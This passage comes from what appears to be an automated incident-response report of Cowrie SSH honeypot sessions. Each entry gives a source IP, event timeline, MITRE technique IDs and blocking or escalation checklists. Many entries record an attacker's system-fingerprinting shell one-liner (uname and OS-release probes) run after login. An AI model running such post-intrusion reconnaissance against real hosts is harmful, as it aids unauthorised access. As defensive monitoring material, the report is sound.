| `2026-07-08 19:32:55` | `cowrie.command.input` |
| `2026-07-08 19:32:55` | `cowrie.command.input` |
| `2026-07-08 19:32:56` | `cowrie.log.closed` |
| `2026-07-08 19:32:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f863d6dd4905

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]114` |
| **First Seen** | 2026-07-08 19:34 |
| **Last Seen** | 2026-07-08 19:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:34:02` | `cowrie.session.connect` |
| `2026-07-08 19:34:02` | `cowrie.client.version` |
| `2026-07-08 19:34:02` | `cowrie.client.kex` |
| `2026-07-08 19:34:02` | `cowrie.login.success` |
| `2026-07-08 19:34:03` | `cowrie.session.params` |
| `2026-07-08 19:34:03` | `cowrie.command.input` |
| `2026-07-08 19:34:03` | `cowrie.log.closed` |
| `2026-07-08 19:34:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]114` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ecd049a2f656

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-08 19:34 |
| **Last Seen** | 2026-07-08 19:34 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:34:47` | `cowrie.session.connect` |
| `2026-07-08 19:34:48` | `cowrie.client.version` |
| `2026-07-08 19:34:48` | `cowrie.client.kex` |
| `2026-07-08 19:34:52` | `cowrie.login.success` |
| `2026-07-08 19:34:56` | `cowrie.session.params` |
| `2026-07-08 19:34:56` | `cowrie.command.input` |
| `2026-07-08 19:34:57` | `cowrie.log.closed` |
| `2026-07-08 19:34:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21681cc9b45c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 19:35 |
| **Last Seen** | 2026-07-08 19:35 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:35:00` | `cowrie.session.connect` |
| `2026-07-08 19:35:00` | `cowrie.client.version` |
| `2026-07-08 19:35:00` | `cowrie.client.kex` |
| `2026-07-08 19:35:02` | `cowrie.login.success` |
| `2026-07-08 19:35:04` | `cowrie.session.params` |
| `2026-07-08 19:35:04` | `cowrie.command.input` |
| `2026-07-08 19:35:04` | `cowrie.command.input` |
| `2026-07-08 19:35:04` | `cowrie.command.input` |
| `2026-07-08 19:35:04` | `cowrie.command.input` |
| `2026-07-08 19:35:04` | `cowrie.command.input` |
| `2026-07-08 19:35:04` | `cowrie.command.success` |
| `2026-07-08 19:35:04` | `cowrie.command.input` |
| `2026-07-08 19:35:04` | `cowrie.command.input` |
| `2026-07-08 19:35:04` | `cowrie.command.input` |
| `2026-07-08 19:35:04` | `cowrie.command.input` |
| `2026-07-08 19:35:05` | `cowrie.log.closed` |
| `2026-07-08 19:35:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e05199d4e486

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-08 19:35 |
| **Last Seen** | 2026-07-08 19:35 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:35:15` | `cowrie.session.connect` |
| `2026-07-08 19:35:15` | `cowrie.client.version` |
| `2026-07-08 19:35:15` | `cowrie.client.kex` |
| `2026-07-08 19:35:16` | `cowrie.login.success` |
| `2026-07-08 19:35:17` | `cowrie.session.params` |
| `2026-07-08 19:35:17` | `cowrie.command.input` |
| `2026-07-08 19:35:17` | `cowrie.command.input` |
| `2026-07-08 19:35:17` | `cowrie.command.input` |
| `2026-07-08 19:35:17` | `cowrie.command.input` |
| `2026-07-08 19:35:17` | `cowrie.command.input` |
| `2026-07-08 19:35:17` | `cowrie.command.success` |
| `2026-07-08 19:35:17` | `cowrie.command.input` |
| `2026-07-08 19:35:17` | `cowrie.command.input` |
| `2026-07-08 19:35:17` | `cowrie.command.input` |
| `2026-07-08 19:35:17` | `cowrie.command.input` |
| `2026-07-08 19:35:17` | `cowrie.log.closed` |
| `2026-07-08 19:35:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b066709119d3

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 19:37 |
| **Last Seen** | 2026-07-08 19:37 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:37:24` | `cowrie.session.connect` |
| `2026-07-08 19:37:25` | `cowrie.client.version` |
| `2026-07-08 19:37:25` | `cowrie.client.kex` |
| `2026-07-08 19:37:26` | `cowrie.login.success` |
| `2026-07-08 19:37:28` | `cowrie.session.params` |
| `2026-07-08 19:37:28` | `cowrie.command.input` |
| `2026-07-08 19:37:28` | `cowrie.command.input` |
| `2026-07-08 19:37:28` | `cowrie.command.input` |
| `2026-07-08 19:37:28` | `cowrie.command.input` |
| `2026-07-08 19:37:28` | `cowrie.command.input` |
| `2026-07-08 19:37:28` | `cowrie.command.success` |
| `2026-07-08 19:37:28` | `cowrie.command.input` |
| `2026-07-08 19:37:28` | `cowrie.command.input` |
| `2026-07-08 19:37:28` | `cowrie.command.input` |
| `2026-07-08 19:37:28` | `cowrie.command.input` |
| `2026-07-08 19:37:28` | `cowrie.log.closed` |
| `2026-07-08 19:37:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0aff5e53c62d

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-08 19:37 |
| **Last Seen** | 2026-07-08 19:37 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:37:34` | `cowrie.session.connect` |
| `2026-07-08 19:37:34` | `cowrie.client.version` |
| `2026-07-08 19:37:34` | `cowrie.client.kex` |
| `2026-07-08 19:37:36` | `cowrie.login.success` |
| `2026-07-08 19:37:38` | `cowrie.session.params` |
| `2026-07-08 19:37:38` | `cowrie.command.input` |
| `2026-07-08 19:37:38` | `cowrie.command.input` |
| `2026-07-08 19:37:38` | `cowrie.command.input` |
| `2026-07-08 19:37:38` | `cowrie.command.input` |
| `2026-07-08 19:37:38` | `cowrie.command.input` |
| `2026-07-08 19:37:38` | `cowrie.command.success` |
| `2026-07-08 19:37:38` | `cowrie.command.input` |
| `2026-07-08 19:37:38` | `cowrie.command.input` |
| `2026-07-08 19:37:38` | `cowrie.command.input` |
| `2026-07-08 19:37:38` | `cowrie.command.input` |
| `2026-07-08 19:37:39` | `cowrie.log.closed` |
| `2026-07-08 19:37:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85fe5f2da8ee

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-08 19:39 |
| **Last Seen** | 2026-07-08 19:39 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:39:36` | `cowrie.session.connect` |
| `2026-07-08 19:39:36` | `cowrie.client.version` |
| `2026-07-08 19:39:36` | `cowrie.client.kex` |
| `2026-07-08 19:39:38` | `cowrie.login.success` |
| `2026-07-08 19:39:40` | `cowrie.session.params` |
| `2026-07-08 19:39:40` | `cowrie.command.input` |
| `2026-07-08 19:39:40` | `cowrie.command.input` |
| `2026-07-08 19:39:40` | `cowrie.command.input` |
| `2026-07-08 19:39:40` | `cowrie.command.input` |
| `2026-07-08 19:39:40` | `cowrie.command.input` |
| `2026-07-08 19:39:40` | `cowrie.command.success` |
| `2026-07-08 19:39:40` | `cowrie.command.input` |
| `2026-07-08 19:39:40` | `cowrie.command.input` |
| `2026-07-08 19:39:40` | `cowrie.command.input` |
| `2026-07-08 19:39:40` | `cowrie.command.input` |
| `2026-07-08 19:39:40` | `cowrie.log.closed` |
| `2026-07-08 19:39:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2423c9144da9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 19:39 |
| **Last Seen** | 2026-07-08 19:39 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:39:43` | `cowrie.session.connect` |
| `2026-07-08 19:39:43` | `cowrie.client.version` |
| `2026-07-08 19:39:43` | `cowrie.client.kex` |
| `2026-07-08 19:39:45` | `cowrie.login.success` |
| `2026-07-08 19:39:47` | `cowrie.session.params` |
| `2026-07-08 19:39:47` | `cowrie.command.input` |
| `2026-07-08 19:39:47` | `cowrie.command.input` |
| `2026-07-08 19:39:47` | `cowrie.command.input` |
| `2026-07-08 19:39:47` | `cowrie.command.input` |
| `2026-07-08 19:39:47` | `cowrie.command.input` |
| `2026-07-08 19:39:47` | `cowrie.command.success` |
| `2026-07-08 19:39:47` | `cowrie.command.input` |
| `2026-07-08 19:39:47` | `cowrie.command.input` |
| `2026-07-08 19:39:47` | `cowrie.command.input` |
| `2026-07-08 19:39:47` | `cowrie.command.input` |
| `2026-07-08 19:39:47` | `cowrie.log.closed` |
| `2026-07-08 19:39:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-053babb6086b

| Field | Detail |
|---|---|
| **Source IP** | `82.165.175[.]206` |
| **First Seen** | 2026-07-08 19:40 |
| **Last Seen** | 2026-07-08 19:40 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:40:54` | `cowrie.session.connect` |
| `2026-07-08 19:40:54` | `cowrie.client.version` |
| `2026-07-08 19:40:54` | `cowrie.client.kex` |
| `2026-07-08 19:40:54` | `cowrie.login.success` |
| `2026-07-08 19:40:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `82.165.175[.]206` to AbuseIPDB if not already reported
- [ ] Block `82.165.175[.]206` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6573a1207fa

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-07-08 19:40 |
| **Last Seen** | 2026-07-08 19:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:40:55` | `cowrie.session.connect` |
| `2026-07-08 19:40:55` | `cowrie.client.version` |
| `2026-07-08 19:40:55` | `cowrie.client.kex` |
| `2026-07-08 19:40:55` | `cowrie.login.success` |
| `2026-07-08 19:40:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b7ed4a58408

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-08 19:41 |
| **Last Seen** | 2026-07-08 19:41 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:41:41` | `cowrie.session.connect` |
| `2026-07-08 19:41:41` | `cowrie.client.version` |
| `2026-07-08 19:41:41` | `cowrie.client.kex` |
| `2026-07-08 19:41:43` | `cowrie.login.success` |
| `2026-07-08 19:41:44` | `cowrie.session.params` |
| `2026-07-08 19:41:44` | `cowrie.command.input` |
| `2026-07-08 19:41:44` | `cowrie.command.input` |
| `2026-07-08 19:41:44` | `cowrie.command.input` |
| `2026-07-08 19:41:44` | `cowrie.command.input` |
| `2026-07-08 19:41:44` | `cowrie.command.input` |
| `2026-07-08 19:41:44` | `cowrie.command.success` |
| `2026-07-08 19:41:44` | `cowrie.command.input` |
| `2026-07-08 19:41:44` | `cowrie.command.input` |
| `2026-07-08 19:41:44` | `cowrie.command.input` |
| `2026-07-08 19:41:45` | `cowrie.command.input` |
| `2026-07-08 19:41:45` | `cowrie.log.closed` |
| `2026-07-08 19:41:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd802e467585

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 19:42 |
| **Last Seen** | 2026-07-08 19:42 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:42:00` | `cowrie.session.connect` |
| `2026-07-08 19:42:01` | `cowrie.client.version` |
| `2026-07-08 19:42:01` | `cowrie.client.kex` |
| `2026-07-08 19:42:02` | `cowrie.login.success` |
| `2026-07-08 19:42:04` | `cowrie.session.params` |
| `2026-07-08 19:42:04` | `cowrie.command.input` |
| `2026-07-08 19:42:04` | `cowrie.command.input` |
| `2026-07-08 19:42:04` | `cowrie.command.input` |
| `2026-07-08 19:42:04` | `cowrie.command.input` |
| `2026-07-08 19:42:04` | `cowrie.command.input` |
| `2026-07-08 19:42:04` | `cowrie.command.success` |
| `2026-07-08 19:42:04` | `cowrie.command.input` |
| `2026-07-08 19:42:04` | `cowrie.command.input` |
| `2026-07-08 19:42:04` | `cowrie.command.input` |
| `2026-07-08 19:42:04` | `cowrie.command.input` |
| `2026-07-08 19:42:05` | `cowrie.log.closed` |
| `2026-07-08 19:42:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d7dc05f31d2

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-08 19:43 |
| **Last Seen** | 2026-07-08 19:43 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:43:02` | `cowrie.session.connect` |
| `2026-07-08 19:43:03` | `cowrie.client.version` |
| `2026-07-08 19:43:03` | `cowrie.client.kex` |
| `2026-07-08 19:43:08` | `cowrie.login.success` |
| `2026-07-08 19:43:10` | `cowrie.session.params` |
| `2026-07-08 19:43:10` | `cowrie.command.input` |
| `2026-07-08 19:43:11` | `cowrie.log.closed` |
| `2026-07-08 19:43:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cdf77d6bf609

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 19:44 |
| **Last Seen** | 2026-07-08 19:44 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:44:20` | `cowrie.session.connect` |
| `2026-07-08 19:44:20` | `cowrie.client.version` |
| `2026-07-08 19:44:20` | `cowrie.client.kex` |
| `2026-07-08 19:44:22` | `cowrie.login.success` |
| `2026-07-08 19:44:23` | `cowrie.session.params` |
| `2026-07-08 19:44:23` | `cowrie.command.input` |
| `2026-07-08 19:44:23` | `cowrie.command.input` |
| `2026-07-08 19:44:23` | `cowrie.command.input` |
| `2026-07-08 19:44:23` | `cowrie.command.input` |
| `2026-07-08 19:44:23` | `cowrie.command.input` |
| `2026-07-08 19:44:23` | `cowrie.command.success` |
| `2026-07-08 19:44:23` | `cowrie.command.input` |
| `2026-07-08 19:44:23` | `cowrie.command.input` |
| `2026-07-08 19:44:23` | `cowrie.command.input` |
| `2026-07-08 19:44:23` | `cowrie.command.input` |
| `2026-07-08 19:44:24` | `cowrie.log.closed` |
| `2026-07-08 19:44:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-981181201ba3

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-08 19:45 |
| **Last Seen** | 2026-07-08 19:46 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 19:45:57` | `cowrie.session.connect` |
| `2026-07-08 19:45:57` | `cowrie.client.version` |
| `2026-07-08 19:45:57` | `cowrie.client.kex` |
| `2026-07-08 19:45:59` | `cowrie.login.success` |
| `2026-07-08 19:46:00` | `cowrie.session.params` |
| `2026-07-08 19:46:00` | `cowrie.command.input` |
| `2026-07-08 19:46:00` | `cowrie.command.input` |
| `2026-07-08 19:46:00` | `cowrie.command.input` |
| `2026-07-08 19:46:00` | `cowrie.command.input` |
| `2026-07-08 19:46:00` | `cowrie.command.input` |
| `2026-07-08 19:46:00` | `cowrie.command.success` |
| `2026-07-08 19:46:00` | `cowrie.command.input` |
